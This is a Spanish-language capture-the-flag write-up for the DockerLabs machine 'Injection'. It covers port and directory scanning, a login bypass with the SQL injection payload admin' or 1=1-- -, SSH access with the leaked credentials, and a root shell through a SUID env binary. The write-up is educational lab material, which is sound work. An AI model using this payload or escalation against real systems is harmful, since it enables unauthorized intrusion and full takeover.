@@ -1,0 +1,199 @@
+---
+title: Injection
+description: Resolución completa de la máquina virtual *Injection* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Injection**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un servidor web con un formulario de login vulnerable a **SQL Injection**, permitiendo el bypass de autenticación y la extracción de credenciales de acceso SSH. Con estas credenciales, se accede al sistema como un usuario no privilegiado.
+Una vez dentro, se identifica que el binario `env` tiene permisos SUID, lo que permite ejecutar una shell con privilegios de `root` mediante la técnica de GTFOBins, completando la escalada de privilegios.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Injection',
+    Autor: 'El Pingüino de Mario',
+    Dificultad: 'Fácil',
+    Fecha: '09/04/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Injection.zip
+sudo bash auto_deplo.sh Injection.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748329772/ipScan_ifwllz.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Injection/{content,exploits,nmap,scripts}
+cd Injection
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1748329773/Ports_emxb2e.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p80 172.17.0.2 -oN targeted
+```
+
+![Servicios detectados](https://res.cloudinary.com/dewqswzke/image/upload/v1748329774/Services_vcy1et.png)
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:
+
+```bash
+gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,html,txt -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1748329771/gobuster_tetkgz.png)
+
+Se detecta la existencia de un archivo `config.php`, pero no es accesible directamente. En el `index.php` aparece un formulario de login:
+
+![Login](https://res.cloudinary.com/dewqswzke/image/upload/v1748329772/index_ph5t1a.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 SQL Injection
+
+Se prueba una inyección SQL básica en el formulario de login:
+
+```
+Usuario: admin' or 1=1-- -
+Contraseña: cualquier valor
+```
+
+Esto permite autenticarse exitosamente y acceder a información sensible:
+
+![Credenciales](https://res.cloudinary.com/dewqswzke/image/upload/v1748329772/pass_vjgcbt.png)
+
+### 2.2 Acceso SSH
+
+Con las credenciales obtenidas, se accede al sistema vía SSH:
+
+```bash
+ssh usuario@172.17.0.2
+```
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De usuario → root
+
+Se verifica que `sudo` no está disponible:
+
+```bash
+sudo -l
+```
+
+![Error sudo](https://res.cloudinary.com/dewqswzke/image/upload/v1748329771/esc_htjbtn.png)
+
+Se buscan binarios con permisos SUID:
+
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+![SUID](https://res.cloudinary.com/dewqswzke/image/upload/v1748329771/exploit_qswete.png)
+
+Se identifica que el binario `/usr/bin/env` tiene permisos SUID.
+
+Se utiliza `searchbins` para verificar la técnica en GTFOBins:
+
+```bash
+searchbins -b env -a
+```
+
+Se ejecuta el siguiente comando para obtener una shell con privilegios de root:
+
+```bash
+/usr/bin/env /bin/bash
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1748329774/Root_t8zq99.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "SQL Injection en formulario de login",
+      severity: "Crítica",
+      impact: "Bypass de autenticación y extracción de credenciales"
+    },
+    {
+      vulnerability: "Credenciales expuestas tras bypass de autenticación",
+      severity: "Alta",
+      impact: "Acceso SSH al sistema"
+    },
+    {
+      vulnerability: "Permiso SUID en binario env",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root"
+    },
+    {
+      vulnerability: "Falta de validación de entradas en formulario web",
+      severity: "Alta",
+      impact: "Múltiples vectores de inyección"
+    },
+    {
+      vulnerability: "Falta de protección contra fuerza bruta",
+      severity: "Media",
+      impact: "Ataques de diccionario ilimitados"
+    }
+  ]}
+/>
